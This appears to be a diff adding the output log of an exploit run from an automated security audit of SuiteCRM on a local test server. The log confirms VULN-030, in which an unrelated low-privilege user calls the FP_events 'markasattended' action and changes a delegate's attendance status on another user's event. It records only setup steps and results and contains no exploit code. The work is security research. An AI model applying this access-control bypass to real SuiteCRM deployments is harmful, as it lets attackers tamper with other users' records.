@@ -1,0 +1,24 @@
+<frozen site>:107: RuntimeWarning: Unexpected value in sys.prefix, expected /opt/cvehunter/claude_audit/SuiteCRM/exploits/.venv, got /opt/cvehunter/claude_audit/SuiteCRM/exploits/VULN-030/../.venv
+<frozen site>:107: RuntimeWarning: Unexpected value in sys.exec_prefix, expected /opt/cvehunter/claude_audit/SuiteCRM/exploits/.venv, got /opt/cvehunter/claude_audit/SuiteCRM/exploits/VULN-030/../.venv
+========================================================================
+VULN-030: FP_events markasattended -- tamper attendance on an event you don't own
+target: http://localhost:33116
+========================================================================
+[SETUP] admin web login
+[SETUP] provisioning victim/organiser (V) and attacker (A) -- fresh, unrelated low-priv users
+[INFO] victim(organiser) = mod_6a1e122a (bdd3be2d-96bb-45d7-abe7-69c2aefaa6b5)
+[INFO] attacker          = mod_94527436 (9933ad84-ebd0-45ff-af3b-1ea306645f76)
+[SETUP] as V: create an FP_events event
+[OK] Event created: 0bf66c8a-b226-443d-9f1b-e96de4cba006 (V030Event_ee75fd09), owned by V
+[SETUP] as V: create a Contact (the delegate)
+[OK] Delegate Contact created: 2ce1c4ac-0032-4f03-a714-720fbaa34baf (last_name=V030Delegate_9c602fed), owned by V
+[SETUP] as V: relate the delegate Contact to the event via Save2 (legitimate app flow)
+[INFO] Save2 relate response status=200
+[STEP] confirm the delegate relationship row exists with the default invite_status before the attack
+[INFO] invite_status BEFORE attack: 'Not Invited'
+[STEP] as A (zero relation to V's event or its delegates): markasattended on V's event
+[INFO] attack response status=200 len=89426
+[PROOF] re-querying fp_events_contacts_c row AFTER the attacker's markasattended
+[PROOF] invite_status AFTER attack: 'Attended'
+[OK] attacker A (no ACL, not the organiser) flipped delegate invite_status 'Not Invited' -> 'Attended' on V's event via markasattended
+==> VULN-030: CONFIRMED — non-owner A tampered attendance on V's FP_events event 0bf66c8a-b226-443d-9f1b-e96de4cba006, invite_status Not Invited->Attended
